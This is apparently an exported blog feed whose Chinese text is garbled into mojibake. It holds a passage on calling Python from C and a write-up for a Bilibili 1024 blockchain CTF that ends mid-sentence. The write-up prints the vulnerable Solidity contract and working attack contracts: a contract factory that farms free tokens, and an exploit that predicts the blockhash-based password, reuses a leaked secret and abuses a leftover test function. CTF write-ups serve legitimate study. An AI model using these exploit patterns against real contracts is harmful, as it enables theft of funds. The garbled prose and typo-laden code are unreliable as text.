ç»å…¸å¤åˆ¶ç²˜è´´å˜é‡ï¼ˆè¿™ç©æ„å„¿è‡ªå·±ä¸€ä¸ªä¸€ä¸ªæ‰“ä¹Ÿå¤ªéº»çƒ¦äº†è€Œä¸”ä¹Ÿè®°ä¸ä½å‘€ï¼‰ Py_Initialize();// åˆå§‹åŒ–ä¸€ä¸‹ï½ if (!Py_IsInitialized())// çœ‹çœ‹åˆå§‹åŒ–æœ‰æ²¡æœ‰æˆåŠŸ &#123; printf(\"åˆå§‹åŒ–å¤±è´¥\\n\"); Py_Finalize(); &#125; PyRun_SimpleString(\"import sys\");// è®¾ç½® python æ¨¡å—ï¼Œæœå¯»ä½ç½®ï¼Œæ–‡ä»¶æ”¾åœ¨.c æ–‡ä»¶ä¸€èµ· PyRun_SimpleString(\"sys.path.append('./')\"); pModule = PyImport_ImportModule(\"hello\");// å¯¼å…¥ hello.py if (!pModule) &#123; printf(\"pyæ–‡ä»¶å¯¼å…¥å¤±è´¥\\n\"); Py_Finalize(); return 1; &#125; pFunc = PyObject_GetAttrString(pModule, \"printhello\"); if (!pFunc) &#123; printf(\"å‡½æ•°å¯¼å…¥å¤±è´¥\\n\"); Py_Finalize(); &#125; pArgs = NULL; pValue = PyObject_CallObject(pFunc, pArgs);// è°ƒç”¨å‡½æ•° Py_Finalize();// é‡Šæ”¾ python return 0;&#125;ä»£ç æ”¹å¥½å¯ä»¥è¿è¡Œå’¯ ä¸ºå•¥è¿™ä¸ª hello,world! è¾“å‡ºä¸¤æ¬¡å˜ çœ‹æ¥ c è°ƒç”¨ python ä¹Ÿæ˜¯å…ˆæŠŠ main å‡½æ•°è¿è¡Œä¸€éçš„å“ˆ # 0x4 æ¥ä¸‹æ¥ï¼Œå¼€å§‹é€†å‘çš„å·¥ä½œï½ å•ç‹¬è¿è¡Œä¸€ä¸‹ can can æ™•ï¼è¿˜å¾— py æ–‡ä»¶æ‰èƒ½è®©ä½ è€è€å®å®è¿è¡Œå—ï¼ï¼Ÿ æŠŠ hello.py æ‹–è¿›å»ä¸€ä»½ï¼Œ, æ­£å¸¸è¿è¡Œ IDA è¿›å»çœ‹çœ‹ # å‚è€ƒèµ„æ–™ https://www.jb51.net/article/212125.htm","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://oacia.dev/tags/python/"},{"name":"Cè¯­è¨€","slug":"Cè¯­è¨€","permalink":"https://oacia.dev/tags/C%E8%AF%AD%E8%A8%80/"},{"name":"äº¤å‰ç¼–è¯‘","slug":"äº¤å‰ç¼–è¯‘","permalink":"https://oacia.dev/tags/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"}]},{"title":"2022å“”å“©å“”å“© 1024ç¨‹åºå‘˜èŠ‚ T4 åŒºå—é“¾è¯¦è§£","slug":"2022å“”å“©å“”å“©_1024ç¨‹åºå‘˜èŠ‚_T4_åŒºå—é“¾è¯¦è§£","date":"2022-10-31T16:00:00.000Z","updated":"2023-07-01T04:10:57.800Z","comments":true,"path":"2022å“”å“©å“”å“©_1024ç¨‹åºå‘˜èŠ‚_T4_åŒºå—é“¾è¯¦è§£/","link":"","permalink":"https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/","excerpt":"æœ¬æ¬¡é¢˜ç›®çš„åœ°å€ä¸º sepolia@0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA # å‰è¨€ è¿™ä¸€æ¬¡ 1024 ç¨‹åºå‘˜èŠ‚ä¸­æœ‰åŒºå—é“¾ç›¸å…³çš„é¢˜ç›®ï¼Œä½œä¸ºä»Šå¹´æ‰å¼€å§‹èµ·æ­¥åŒºå—é“¾çš„å°èŒæ–°ï¼Œè¿™ä¸€é¢˜ä¹Ÿæ˜¯æ•´æ•´çœ‹äº†ä¸€æ•´ä¸ªå‘¨æœ«æ‰åšå‡ºæ¥ï¼Œä¸è¿‡åšå‡ºæ¥ä¹‹åä¹Ÿæ˜¯ç›¸å½“çš„å…·æœ‰æˆå°±æ„Ÿæ»´ï¼š), è¯ä¸å¤šè¯´ï¼Œæˆ‘ä»¬ç°åœ¨å°±æ¥çœ‹ä¸€çœ‹å¦‚ä½•åšå‡ºè¿™ä¸€é¢˜.","text":"æœ¬æ¬¡é¢˜ç›®çš„åœ°å€ä¸º sepolia@0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA # å‰è¨€ è¿™ä¸€æ¬¡ 1024 ç¨‹åºå‘˜èŠ‚ä¸­æœ‰åŒºå—é“¾ç›¸å…³çš„é¢˜ç›®ï¼Œä½œä¸ºä»Šå¹´æ‰å¼€å§‹èµ·æ­¥åŒºå—é“¾çš„å°èŒæ–°ï¼Œè¿™ä¸€é¢˜ä¹Ÿæ˜¯æ•´æ•´çœ‹äº†ä¸€æ•´ä¸ªå‘¨æœ«æ‰åšå‡ºæ¥ï¼Œä¸è¿‡åšå‡ºæ¥ä¹‹åä¹Ÿæ˜¯ç›¸å½“çš„å…·æœ‰æˆå°±æ„Ÿæ»´ï¼š), è¯ä¸å¤šè¯´ï¼Œæˆ‘ä»¬ç°åœ¨å°±æ¥çœ‹ä¸€çœ‹å¦‚ä½•åšå‡ºè¿™ä¸€é¢˜. # æºç  å…ˆä¸Šåˆçº¦æºç â†“â†“â†“â†“â†“â†“ // SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)pragma solidity 0.8.12;import \"./IERC20.sol\";import \"./IERC20Metadata.sol\";import \"./Context.sol\";//import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";//import \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";//import \"@openzeppelin/contracts/utils/Context.sol\";struct Coupon &#123; uint loankey; uint256 amount; address buser; bytes reason;&#125;struct Signature &#123; uint8 v; bytes32[2] rs;&#125;struct SignCoupon &#123; Coupon coupon; Signature signature;&#125;contract MyToken is Context, IERC20, IERC20Metadata &#123; mapping(address => uint256) public _balances; mapping(address => uint) public _ebalances; mapping(address => uint) public ethbalances; mapping(address => mapping(address => uint256)) private _allowances; mapping(address => uint) public _profited; mapping(address => uint) public _auth_one; mapping(address => uint) public _authd; mapping(address => uint) public _loand; mapping(address => uint) public _flag; mapping(address => uint) public _depositd; uint256 private _totalSupply; string private _name; string private _symbol; address owner; address backup; uint secret; uint tokenprice; Coupon public c; address public lala; address public xixi; //mid = bilibili uid //b64email = base64(your email address) //Don't leak your bilibili uid //Gmail is ok. 163 and qq may have some problems. event sendflag(string mid, string b64email); event changeprice(uint secret_); constructor(string memory name_, string memory symbol_, uint secret_) &#123; _name = name_; _symbol = symbol_; owner = msg.sender; backup = msg.sender; tokenprice = 6; secret = secret_; _mint(owner, 2233102400); &#125; modifier onlyowner() &#123; require(msg.sender == owner); _; &#125; /** * @dev Returns the name of the token. */ function name() public view virtual override returns (string memory) &#123; return _name; &#125; function symbol() public view virtual override returns (string memory) &#123; return _symbol; &#125; function decimals() public view virtual override returns (uint8) &#123; return 18; &#125; /** * @dev See &#123;IERC20-totalSupply&#125;. */ function totalSupply() public view virtual override returns (uint256) &#123; return _totalSupply; &#125; /** * @dev See &#123;IERC20-balanceOf&#125;. */ function balanceOf(address account) public view virtual override returns (uint256) &#123; return _balances[account]; &#125; function transfer(address to, uint256 amount) public virtual override returns (bool) &#123; address owner = _msgSender(); _transfer(owner, to, amount); return true; &#125; function deposit() public &#123; require(_depositd[msg.sender] == 0, \"you can only deposit once\"); _depositd[msg.sender] = 1; ethbalances[msg.sender] += 1; &#125; function getBalance() public view returns (uint) &#123; return address(this).balance; &#125; function setbackup() public onlyowner &#123; owner = backup; &#125; function ownerbackdoor() public &#123; require(msg.sender == owner); _mint(owner, 1000); &#125; function auth1(uint pass_) public &#123; require(pass_ == secret, \"auth fail\"); require(_authd[msg.sender] == 0, \"already authd\"); _auth_one[msg.sender] += 1; _authd[msg.sender] += 1; &#125; function auth2(uint pass_) public &#123; uint pass = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); require(pass == pass_, \"password error, auth fail\"); require(_auth_one[msg.sender] == 1, \"need pre auth\"); require(_authd[msg.sender] == 1, \"already authd\"); _authd[msg.sender] += 1; &#125; function payforflag(string memory mid, string memory b64email) public &#123; require(_flag[msg.sender] == 2); emit sendflag(mid, b64email); &#125; function flashloan(SignCoupon calldata scoupon) public &#123; require(scoupon.coupon.loankey == 0, \"loan key error\"); require(msg.sender == address(this), \"hacker get out\"); Coupon memory coupon = scoupon.coupon; Signature memory sig = scoupon.signature; c=coupon; require(_authd[scoupon.coupon.buser] == 2, \"need pre auth\"); require(_loand[scoupon.coupon.buser] == 0, \"you have already loaned\"); require(scoupon.coupon.amount &lt;= 300, \"loan amount error\"); _loand[scoupon.coupon.buser] = 1; _ebalances[scoupon.coupon.buser] += scoupon.coupon.amount; &#125; function profit() public &#123; require(_profited[msg.sender] == 0); _profited[msg.sender] += 1; _transfer(owner, msg.sender, 1); &#125; function borrow(uint amount) public &#123; require(amount == 1); require(_profited[msg.sender] &lt;= 1); _profited[msg.sender] += 1; _transfer(owner, msg.sender, amount); &#125; function buy(uint amount) public &#123; require(amount &lt;= 300, \"max buy count is 300\"); uint price; uint ethmount = _ebalances[msg.sender]; if (ethmount &lt; 10) &#123; price = 1000000; &#125; else if (ethmount >= 10 &amp;&amp; ethmount &lt;= 233) &#123; price = 10000; &#125; else &#123; price = 1; &#125; uint payment = amount * price; require(payment &lt;= ethmount); _ebalances[msg.sender] -= payment; _transfer(owner, msg.sender, amount); &#125; function sale(uint amount) public &#123; require(_balances[msg.sender] >= amount, \"fail to sale\"); uint earn = amount * tokenprice; _transfer(msg.sender, owner, amount); _ebalances[msg.sender] += earn; &#125; function withdraw() public &#123; require(ethbalances[msg.sender] >= 1); require(_ebalances[msg.sender] >= 1812); payable(msg.sender).call&#123;value:100000000000000000 wei&#125;(\"\"); _ebalances[msg.sender] = 0; _flag[msg.sender] += 1; &#125; /** * @dev See &#123;IERC20-allowance&#125;. */ function allowance(address owner, address spender) public view virtual override returns (uint256) &#123; return _allowances[owner][spender]; &#125; function approve(address spender, uint256 amount) public virtual override returns (bool) &#123; address owner = _msgSender(); _approve(owner, spender, amount); return true; &#125; function transferFrom( address from, address to, uint256 amount ) public virtual override returns (bool) &#123; require(msg.sender == owner); // ä¸å…è®¸è¢« owner ä»¥å¤–è°ƒç”¨ address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true; &#125; function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123; require(msg.sender == owner); // ä¸å…è®¸è¢« owner ä»¥å¤–è°ƒç”¨ address owner = _msgSender(); _approve(owner, spender, allowance(owner, spender) + addedValue); return true; &#125; function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123; require(msg.sender == owner); // ä¸å…è®¸è¢« owner ä»¥å¤–è°ƒç”¨ address owner = _msgSender(); uint256 currentAllowance = allowance(owner, spender); require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\"); unchecked &#123; _approve(owner, spender, currentAllowance - subtractedValue); &#125; return true; &#125; function _transfer( address from, address to, uint256 amount ) internal virtual &#123; require(from != address(0), \"ERC20: transfer from the zero address\"); require(to != address(0), \"ERC20: transfer to the zero address\"); _beforeTokenTransfer(from, to, amount); uint256 fromBalance = _balances[from]; require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\"); unchecked &#123; _balances[from] = fromBalance - amount; // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by // decrementing then incrementing. _balances[to] += amount; &#125; emit Transfer(from, to, amount); _afterTokenTransfer(from, to, amount); &#125; function _mint(address account, uint256 amount) internal virtual &#123; require(account != address(0), \"ERC20: mint to the zero address\"); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; unchecked &#123; // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above. _balances[account] += amount; &#125; emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount); &#125; function _burn(address account, uint256 amount) internal virtual &#123; require(account != address(0), \"ERC20: burn from the zero address\"); _beforeTokenTransfer(account, address(0), amount); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\"); unchecked &#123; _balances[account] = accountBalance - amount; // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply. _totalSupply -= amount; &#125; emit Transfer(account, address(0), amount); _afterTokenTransfer(account, address(0), amount); &#125; function _approve( address owner, address spender, uint256 amount ) internal virtual &#123; require(owner != address(0), \"ERC20: approve from the zero address\"); require(spender != address(0), \"ERC20: approve to the zero address\"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); &#125; function _spendAllowance( address owner, address spender, uint256 amount ) internal virtual &#123; uint256 currentAllowance = allowance(owner, spender); if (currentAllowance != type(uint256).max) &#123; require(currentAllowance >= amount, \"ERC20: insufficient allowance\"); unchecked &#123; _approve(owner, spender, currentAllowance - amount); &#125; &#125; &#125; function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual &#123;&#125; function _afterTokenTransfer( address from, address to, uint256 amount ) internal virtual &#123;&#125; // debug param secret function get_secret() public view returns (uint) &#123; require(msg.sender == owner); return secret; &#125; // debug param tokenprice function get_price() public view returns (uint) &#123; return tokenprice; &#125; // test need to be delete function testborrowtwice(SignCoupon calldata scoupon) public &#123; require(scoupon.coupon.loankey == 2233); MyToken(this).flashloan(scoupon); &#125; // test need to be delete function set_secret(uint secret_) public onlyowner &#123; secret = secret_; emit changeprice(secret_); &#125;&#125;# 1. æ˜ç¡®ç›®æ ‡ è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°äº†ä¸€ä¸ªå‡½æ•° payforflag , å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨è¿™ä¸€ä¸ªå‡½æ•°æ¥è·å¾—æˆ‘ä»¬çš„ flag, é‚£ä¹ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ¡ä»¶æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ function payforflag(string memory mid, string memory b64email) public &#123; require(_flag[msg.sender] == 2); emit sendflag(mid, b64email); &#125;æˆ‘ä»¬éœ€è¦ _flag[msg.sender] çš„å€¼ä¸º 2 æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯å¯»æ‰¾å‡½æ•°ä½¿ _flag[msg.sender] çš„å€¼åˆ° 2. é€šè¿‡å¯»æ‰¾ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº† withdraw è¿™ä¸ªå‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œåˆ†åˆ«æ˜¯ ethbalances[msg.sender] &gt;= 1 å’Œ _ebalances[msg.sender] &gt;= 1812 . function withdraw() public &#123; require(ethbalances[msg.sender] >= 1); require(_ebalances[msg.sender] >= 1812); payable(msg.sender).call&#123;value:100000000000000000 wei&#125;(\"\"); _ebalances[msg.sender] = 0; _flag[msg.sender] += 1; &#125;# ç¬¬ä¸€ä¸ªæ¡ä»¶ å…ˆçœ‹ç¬¬ä¸€ä¸ªæ¡ä»¶ ethbalances[msg.sender] &gt;= 1 , æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ deposit è¿™ä¸ªå‡½æ•°æ¥ä»¤å…¶æ»¡è¶³ function deposit() public &#123; require(_depositd[msg.sender] == 0, \"you can only deposit once\"); _depositd[msg.sender] = 1; ethbalances[msg.sender] += 1; &#125;# ç¬¬äºŒä¸ªæ¡ä»¶ å†çœ‹ç¬¬äºŒä¸ªæ¡ä»¶ _ebalances[msg.sender] &gt;= 1812 , æ¶‰åŠåˆ°è¯¥å˜é‡çš„å‡½æ•°æœ‰ profit , borrow , buy , sale function profit() public &#123; require(_profited[msg.sender] == 0); _profited[msg.sender] += 1; _transfer(owner, msg.sender, 1); &#125; function borrow(uint amount) public &#123;// è·å¾— 1 ä¸ª_balances require(amount == 1); require(_profited[msg.sender] &lt;= 1); _profited[msg.sender] += 1; _transfer(owner, msg.sender, amount); &#125; function buy(uint amount) public &#123;// é€šè¿‡å‡ºå”®_ebalances è´­ä¹°_balances require(amount &lt;= 300, \"max buy count is 300\"); uint price; uint ethmount = _ebalances[msg.sender]; if (ethmount &lt; 10) &#123; price = 1000000; &#125; else if (ethmount >= 10 &amp;&amp; ethmount &lt;= 233) &#123; price = 10000; &#125; else &#123; price = 1; &#125; uint payment = amount * price; require(payment &lt;= ethmount); _ebalances[msg.sender] -= payment; _transfer(owner, msg.sender, amount); &#125; function sale(uint amount) public &#123;// é€šè¿‡å‡ºå”®_balances è·å¾—_ebalances require(_balances[msg.sender] >= amount, \"fail to sale\"); uint earn = amount * tokenprice; _transfer(msg.sender, owner, amount); _ebalances[msg.sender] += earn; &#125;æˆ‘ä»¬çœ‹çœ‹ profit è¿™ä¸ªå‡½æ•°ï¼Œåªèƒ½è¿è¡Œä¸€æ¬¡ï¼Œè·å¾—ä¸€ä¸ª _balances ; è€Œ borrow è¿™ä¸ªå‡½æ•°ï¼Œä¸€å…±å¯ä»¥æ‰§è¡Œä¸¤æ¬¡è·å¾—ä¸¤ä¸ª _balances . ä½†æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æœ‰ _profited[msg.sender] è¿™ä¸ªå˜é‡è¿›è¡Œé™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æœ€å¤šåªèƒ½é€šè¿‡ profit æˆ– borrow å‡½æ•°è·å¾— 2 ä¸ª _balances . é‚£ä¹ˆ _balances æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿçœ‹ä¸€çœ‹ sale å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ _balances å–æ‰å¾—åˆ° _ebalances , å…¶ä¸­ tokenprice å·²ç»è¢«å®šä¹‰ä¸º 6 äº†ï¼Œæ‰€ä»¥ _balances ä¸ _ebalances ä¹‹é—´çš„å…‘æ¢æ¯”ä¾‹ä¸º 1:6. è€Œ buy è¿™ä¸ªå‡½æ•°ï¼Œåªæœ‰å½“ _ebalances å¤§äº 233 æ—¶ï¼Œ _ebalances ä¸ _balances ä¹‹é—´çš„å…‘æ¢æ¯”ä¾‹æ‰æ˜¯ 1:1. ä»”ç»†çœ‹çœ‹ä¸Šé¢ä¸¤æ®µè¯ï¼Œç¨å¾®æ€è€ƒä¸€ä¸‹å°±å¯ä»¥æ˜ç™½ï¼Œåªè¦æˆ‘çš„ _ebalances æ¯” 233 è¦å¤§ï¼Œé‚£ä¹ˆä¸å°±å¯ä»¥é€šè¿‡ä¸ _balances äº’åˆ·çš„æ–¹å¼ä¸æ–­å¢åŠ æˆ‘çš„ _ebalances ä»è€Œæ»¡è¶³æ¡ä»¶ 2 _ebalances[msg.sender] &gt;= 1812 ?! è¿™é‡Œæˆ‘ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œå‡è®¾æˆ‘ç°åœ¨æœ‰ _ebalances 300 ä¸ªï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥é€šè¿‡ buy(300) è·å¾— _balances 300 ä¸ªï¼Œéšååœ¨é€šè¿‡ sale(300) è·å¾— _ebalances 300*6=1800 ä¸ªï¼Œç„¶åå†é‡å¤ä¸Šé¢çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆæˆ‘çš„ _ebalances ä¸ä¹…å¯ä»¥æºæºä¸æ–­çš„å¢åŠ çš„å—ï½ï½ï½ï½ æ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¦åšçš„å¯ä»¥æ˜¯: è·å¾— _ebalances å¤§äº 233 ä¸ª æˆ–è€… _balances å¤§äºç­‰äº 39 ä¸ª (å› ä¸ºè·å¾— 39 ä¸ªä»¥ä¸Šçš„ _balances åï¼Œå¯ä»¥é€šè¿‡ sale å‡½æ•°è·å¾—çš„ _ebalances çš„æ•°é‡æ˜¯ 6* _balances , å³ 234 ä¸ª) # 2. ç¼–å†™æ”»å‡»åˆçº¦ åœ¨æ±‚è§£è¿™ä¸€é¢˜çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘æƒ³åˆ°äº†ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥æ¥è·å¾— flag, æ¥ä¸‹æ¥å¬æˆ‘ä¸€ä¸€é“æ¥ï½ï½ # æ–¹æ³•â‘  æˆ‘ä»¬çŸ¥é“æ¯ä¸€ä¸ªåˆå§‹è´¦å·éƒ½å¯ä»¥å›ºå®šè·å¾— 2 ä¸ª _balances , é‚£ä¹ˆæˆ‘ä»¬èƒ½å¦é€šè¿‡å°å·ä¸ºå¤§å·é€šè¿‡ transfer æ–¹æ³•å‘é€ _balances çš„æ–¹æ³•è·å¾—è¶³å¤Ÿæ•°é‡çš„ _balances å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯è¡Œçš„. ç›´æ¥ä¸Šä»£ç ï¼ å…ˆå†™ä¸€ä¸ªæ‹¿ä¸¤ä¸ª _balances å¹¶è½¬ç»™å¤§å·çš„åˆçº¦ // SPDX-License-Identifier: MITpragma solidity ^0.8.12;import \"./ctf.sol\";contract mulcreate &#123; MyToken public mytoken; constructor(address _MyTokenAddress) &#123; mytoken = MyToken(_MyTokenAddress); &#125; receive() external payable &#123;&#125; function onestep() public&#123; mytoken.borrow(1); mytoken.borrow(1); mytoken.transfer(adreess(ä½ çš„ä¸»è´¦æˆ·åœ°å€),2); &#125;&#125;å†å†™ä¸€ä¸ªæ‰¹é‡åˆ›å»ºåˆçº¦çš„åˆçº¦ // SPDX-License-Identifier: MITpragma solidity ^0.8.12;import \"./create_contract.sol\";contract mulcreate_Factory &#123; mulcreate Mulcreate; function create() external &#123; uint i = 0; for(i=0;i&lt;=20;i=i+1)&#123; Mulcreate = new mulcreate(0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA);// è¿™ä¸ªåœ°å€å°±æ˜¯é¢˜ç›®åˆçº¦çš„åœ°å€ Mulcreate.onestep(); &#125; &#125;&#125;é€šè¿‡è°ƒç”¨ç¬¬äºŒä¸ªåˆçº¦ï¼Œç»™å¤§å·è¶³å¤Ÿçš„ _balances å¯åŠ¨èµ„é‡‘ï¼Œå°±å¯ä»¥å¼€å§‹åˆ· _ebalances æ‹¿ flag å’¯ï½ï½ # æ–¹æ³•â‘¡ ç»†å¿ƒçš„åŒå­¦åœ¨åšè¿™é¢˜çš„æ—¶å€™æœ‰æ²¡æœ‰å‘ç°è¿™ä¸ªå‡½æ•° flashloan , å¯ä»¥ç›´æ¥ç»™ä½ å¢åŠ  300 çš„ _ebalances ! function flashloan(SignCoupon calldata scoupon) public &#123; require(scoupon.coupon.loankey == 0, \"loan key error\"); require(msg.sender == address(this), \"hacker get out\"); Coupon memory coupon = scoupon.coupon; Signature memory sig = scoupon.signature; c=coupon; require(_authd[scoupon.coupon.buser] == 2, \"need pre auth\"); require(_loand[scoupon.coupon.buser] == 0, \"you have already loaned\"); require(scoupon.coupon.amount &lt;= 300, \"loan amount error\"); _loand[scoupon.coupon.buser] = 1; _ebalances[scoupon.coupon.buser] += scoupon.coupon.amount; &#125;ä¸è¿‡ç›´æ¥ç¼–å†™æ”»å‡»åˆçº¦æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°è‚¯å®šæ˜¯ä¸è¡Œæ»´ï¼Œå› ä¸º require(msg.sender == address(this), &quot;hacker get out&quot;) è¿™ä¸€å¥çš„é™åˆ¶äº†ï¼Œå’‹åŠå˜ï¼Ÿ å†æ‰¾æ‰¾çœ‹å­ï½ï½äºæ˜¯æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªè°ƒç”¨ flashloan çš„å‡½æ•° testborrowtwice , è¿™ä¸å°±æ­£å¥½å¯ä»¥æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶äº†å—ï½ function testborrowtwice(SignCoupon calldata scoupon) public &#123; require(scoupon.coupon.loankey == 2233); MyToken(this).flashloan(scoupon); &#125; ä¸è¿‡ flashloan å†…è¿˜æœ‰é™åˆ¶æ¡ä»¶ require(_authd[scoupon.coupon.buser] == 2, &quot;need pre auth&quot;) , å°±æ˜¯è¯´éœ€è¦éªŒè¯çš„æ„æ€ï¼Œæˆ‘ä»¬æ‰¾æ‰¾è¿™ä¸¤ä¸ªéªŒè¯å‡½æ•° auth1 å’Œ auth2 function auth1(uint pass_) public &#123; require(pass_ == secret, \"auth fail\"); require(_authd[msg.sender] == 0, \"already authd\"); _auth_one[msg.sender] += 1; _authd[msg.sender] += 1; &#125; function auth2(uint pass_) public &#123; uint pass = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); require(pass == pass_, \"password error, auth fail\"); require(_auth_one[msg.sender] == 1, \"need pre auth\"); require(_authd[msg.sender] == 1, \"already authd\"); _authd[msg.sender] += 1; &#125;å¯¹äº auth1 , secret ä¸æ˜¯ç›´æ¥åœ¨ constructor ä¸­æœ‰å®šä¹‰äº†å˜›ï½ç›´æ¥çœ‹åˆçº¦ NICEï¼ä¸€ä¸‹å­å°±æ‰¾åˆ°äº†æ ¹æœ¬éš¾ä¸å€’æˆ‘ä»¬ï½ ä½†æ˜¯å½“ä½ å¼€å¼€å¿ƒå¿ƒçš„æŠŠï¼‘ï¼’ï¼“ï¼”ï¼•ï¼–è¾“è¿›å»çš„æ—¶å€™ï¼Œç»“æœå‘ç°å±…ç„¶æ²¡é€šè¿‡ï¼Ÿï¼Ÿï¼Ÿ å’‹å›äº‹å˜ å†æ‰¾æ‰¾çœ‹å’¯ äºæ˜¯ä½ å†æºç ä¸­å‘ç°äº†è¿™ä¸ª set_secret ! æ²¡æƒ³åˆ° owner è¿˜å¯ä»¥æ”¹ secret!! function set_secret(uint secret_) public onlyowner &#123; secret = secret_; emit changeprice(secret_); &#125;è¿™ä¸ªæˆ‘ä»¬ç©åŒºå—é“¾çš„æ ¹æœ¬ä¸æ…Œæ»´ï¼ŒåŒºå—é“¾çš„æ¯ä¸€ç¬”äº¤æ˜“éƒ½æ˜¯æœ‰è®°å½•çš„ï¼Œæˆ‘ä»¬ç›´æ¥å»çœ‹æœ€æ—©çš„äº¤æ˜“è®°å½•. å˜¿å˜¿ è¿™ä¸å°±æœ‰äº†å˜›ï½ çœ‹çœ‹è¿™ç¬”äº¤æ˜“çš„ä¿¡æ¯ å˜¿å˜¿ secret å°±æ˜¯ 0x154be90, è½¬ä¸€ä¸‹åè¿›åˆ¶å°±æ˜¯ 22331024, è¿˜æŒºæœ‰å¯“æ„çš„å˜›ï½ æ¥ä¸‹æ¥å°±æ˜¯æ auth2 çš„æ—¶å€™äº† function auth2(uint pass_) public &#123; uint pass = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); require(pass == pass_, \"password error, auth fail\"); require(_auth_one[msg.sender] == 1, \"need pre auth\"); require(_authd[msg.sender] == 1, \"already authd\"); _authd[msg.sender] += 1; &#125;å½“æˆ‘çœ‹åˆ° uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) è¿™ä¸ªçš„æ—¶å€™ï¼Œæˆ‘ç¬é—´ä¹å¼€äº†èŠ±ï¼Œè¿™æˆ‘å¯å¤ªç†Ÿæ‚‰ä¸è¿‡äº†ï½ çœ‹çœ‹è¿™ç¯‡æ–‡ç«  Source of Randomness ç®€ç›´ç®€ç›´å°±æ˜¯ä¸€ä¸ªæ¨¡å­é‡Œåˆ»å‡ºæ¥çš„å“‡ï¼Œ uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) è¿™ç©æ„å„¿çœ‹ç€éšæœºï¼Œå…¶å®æ˜¯ç¡®å®šçš„ï¼ æ¥ä¸‹æ¥å†™ä¸ªæ”»å‡»åˆçº¦å°±å¯ä»¥èµšåˆ°å¤§æŠŠå¤§æŠŠçš„ _balances å’¯ ç›´æ¥ä¸Šä»£ç ï¼ // SPDX-License-Identifier: MITpragma solidity ^0.8.12;import \"./ctf.sol\";contract Attack &#123; MyToken public mytoken; constructor(address _MyTokenAddress) &#123;//_MyTokenAddress æ˜¯é¢˜ç›®çš„åˆçº¦åœ°å€ mytoken = MyToken(_MyTokenAddress); &#125; receive() external payable &#123;&#125; function attack() public&#123; mytoken.deposit();// æ»¡è¶³ ethbalances [msg.sender] >= 1 mytoken.borrow(1); mytoken.borrow(1);// å¾—åˆ°ä¸¤ä¸ª_balances mytoken.auth1(22331024);// ç¬¬ä¸€ä¸ªéªŒè¯ uint answer = uint( keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)) ); mytoken.auth2(answer);// ç¬¬äºŒä¸ªéªŒè¯ SignCoupon memory scoupon; scoupon.coupon.loankey=2233; scoupon.coupon.amount=300; scoupon.coupon.buser=address(this); mytoken.testborrowtwice(scoupon);// è·å¾—_ebalances 300 ä¸ª mytoken.buy(302);// ç”¨_ebalances å»æ¢_balances 302 ä¸ª mytoken.transfer(adrress(ä½ è‡ªå·±çš„è´¦æˆ·åœ°å€),302);// ç»™ä½ çš„å¤§å·è½¬è´¦_balances 302 ä¸ª &#125; function getBalance() public view returns (uint) &#123; return address(this).balance; &#125;&#125;è¿™é‡Œç®€å•è¯´æ˜ä¸€ä¸‹ä¸ºä»€ä¹ˆå°† scoupon.coupon.loankey èµ‹å€¼ä¸º 2233 é€šè¿‡ testborrowtwice åï¼Œåœ¨ flashloan å‡½æ•°ä¸­ scoupon.coupon.loankey åˆå˜ä¸º 0, è¿™ç”±äº solidity0.8.12 